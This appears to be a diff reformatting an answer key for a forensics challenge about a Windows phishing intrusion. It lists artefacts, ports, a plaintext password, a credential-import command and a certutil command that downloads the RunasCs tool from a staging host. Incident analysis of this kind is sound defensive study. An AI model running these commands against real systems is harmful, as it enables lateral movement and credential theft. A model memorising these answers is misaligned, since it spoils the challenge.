@@ -10,76 +10,91 @@ The goal of this analysis is to reconstruct the full attack chain by examining d
 Steven, a junior consultant at a mid-sized firm recently downloaded a document from an external source, leading to a potential security incident. An attacker may have gained unauthorized access to a Windows machine, leaving behind traces of their activities. Your task is to examine the available disk artifacts to identify any suspicious behavior and help secure the system.
 
 ## Task 1:
-Q: What is the name of the malicious document used in phishing, which facilitated initial access for the attacker?
-
-A: `Policy.docm`
+What is the name of the malicious document used in phishing, which facilitated initial access for the attacker?
+```text
+Policy.docm
+```
 
 ## Task 2:
-Q: What was the full link from which the malicious document was downloaded?
-
-A: `https://drive.usercontent.google.com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download`
+What was the full link from which the malicious document was downloaded?
+```text
+https://drive.usercontent.google.com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download
+```
 
 ## Task 3:
-Q: The document downloaded a script, which acted as a stager and downloaded another payload, providing the attacker with hands-on remote access. When was this script downloaded?
-
-A: `2025-06-07 05:42:11`
+The document downloaded a script, which acted as a stager and downloaded another payload, providing the attacker with hands-on remote access. When was this script downloaded?
+```text
+2025-06-07 05:42:11
+```
 
 ## Task 4:
-Q: What is the full path of the final payload which provided remote access to the attacker?
-
-A: `C:\users\Steven\AppData\Roaming\OpenDLL.exe`
+What is the full path of the final payload which provided remote access to the attacker?
+```text
+C:\users\Steven\AppData\Roaming\OpenDLL.exe
+```
 
 ## Task 5:
-Q: Which port was used for C2 communication by the payload?
-
-A: `8899`
+Which port was used for C2 communication by the payload?
+```text
+8899
+```
 
 ## Task 6:
-Q: The threat actor utilized a file created and used by Steven even before the attack. This file allowed the attacker to authenticate as user "Samy", abusing DPAPI to grab credentials of another user on the same machine. What is the full path of this file?
-
-A: `C:\Users\Samy\Documents\connection.xml`
+The threat actor utilized a file created and used by Steven even before the attack. This file allowed the attacker to authenticate as user "Samy", abusing DPAPI to grab credentials of another user on the same machine. What is the full path of this file?
+```text
+C:\Users\Samy\Documents\connection.xml
+```
 
 ## Task 7:
-Q: What is the full command used to grab credentials from the "Samy" account?
-
-A: `$cred = Import-CliXml -Path connection.xml`
+What is the full command used to grab credentials from the "Samy" account?
+```text
+$cred = Import-CliXml -Path connection.xml
+```
 
 ## Task 8:
-Q: The attacker downloaded a tool from their internal staging server to laterally move and gain remote access as "Samy" user account. What is the full command used to download the tool?
-
-A: `"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe`
+The attacker downloaded a tool from their internal staging server to laterally move and gain remote access as "Samy" user account. What is the full command used to download the tool?
+```text
+"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe
+```
 
 ## Task 9:
-Q: What is the password for the user account "Samy", used by the attacker to gain a remote shell?
-
-A: `Winter2025!`
+What is the password for the user account "Samy", used by the attacker to gain a remote shell?
+```text
+Winter2025!
+```
 
 ## Task 10:
-Q: After gaining access as Samy, the attacker downloaded a script to check privileges for the account. What is the name of the script?
-
-A: `psgetsys.ps1`
+After gaining access as Samy, the attacker downloaded a script to check privileges for the account. What is the name of the script?
+```text
+psgetsys.ps1
+```
 
 ## Task 11:
-Q: The attacker exploited a Windows process to gain an elevated remote shell. What is the PID of this process?
-
-A: `632`
+The attacker exploited a Windows process to gain an elevated remote shell. What is the PID of this process?
+```text
+632
+```
 
 ## Task 12:
-Q: Which port was used for remote access with escalated privileges?
-
-A: `9006`
+Which port was used for remote access with escalated privileges?
+```text
+9006
+```
 
 ## Task 13:
-Q: The attacker enabled persistence mechanisms for a backdoor executable. What is the full path of the file?
-
-A: `C:\Windows\system32\document.pdf.exe`
+The attacker enabled persistence mechanisms for a backdoor executable. What is the full path of the file?
+```text
+C:\Windows\system32\document.pdf.exe
+```
 
 ## Task 14:
-Q: The attacker also abused Windows shortcuts and placed a rogue shortcut file pointing to the malicious backdoor. What is the shortcut file name?
-
-A: `NetworkDiagnostics.lnk`
+The attacker also abused Windows shortcuts and placed a rogue shortcut file pointing to the malicious backdoor. What is the shortcut file name?
+```text
+NetworkDiagnostics.lnk
+```
 
 ## Task 15:
-Q: What is the full path of the script that created the shortcut persistence?
-
-A: `C:\programdata\wscript.vbs`
+What is the full path of the script that created the shortcut persistence?
+```text
+C:\programdata\wscript.vbs
+```
